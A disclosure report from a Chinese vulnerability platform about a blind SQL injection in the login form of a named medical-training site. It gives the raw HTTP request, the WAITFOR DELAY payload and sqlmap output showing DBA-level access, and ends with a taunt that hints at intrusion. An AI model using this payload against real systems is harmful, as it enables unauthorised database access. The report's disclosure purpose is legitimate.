wybug_title: 华医网某站sql注入漏洞(dba权限)
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-11-23：	细节已通知厂商并且等待厂商处理中									2015-11-28：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  
http://gzzz.91huayi.com
登录框处
POST /zgpxServ/ManagerLoginServ.aspx HTTP/1.1Host: gzzz.91huayi.comUser-Agent: Mozilla/5.0 (Windows NT 6.2; rv:42.0) Gecko/20100101 Firefox/42.0Accept: application/xml, text/xml, */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://gzzz.91huayi.com/Content-Length: 25Cookie: Hm_lvt_b8b19370771d6914b2aac73158a962b8=1448095763; Hm_lpvt_b8b19370771d6914b2aac73158a962b8=1448096444; Hm_lvt_ff0968fe442c4e89bf0c5108743a5f31=1448096058; Hm_lpvt_ff0968fe442c4e89bf0c5108743a5f31=1448096092; ASP.NET_SessionId=f5xeeqosusospdyc3xvd5mnvConnection: keep-alivePragma: no-cacheCache-Control: no-cacheuserName=aaa&passWord=aaa
username   漏洞证明：  
sqlmap resumed the following injection point(s) from stored session:---Parameter: userName (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: userName=aaa';WAITFOR DELAY '0:0:5'--&passWord=aaa---[01:35:52] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005[01:35:52] [INFO] fetching current database[01:35:52] [INFO] resumed: XLJY_Guizhoucurrent database:    'XLJY_Guizhou'
盲注，dba权限，给你看看



你猜我进去了没有   修复方案：     版权声明：转载请注明来源 路人甲@乌云
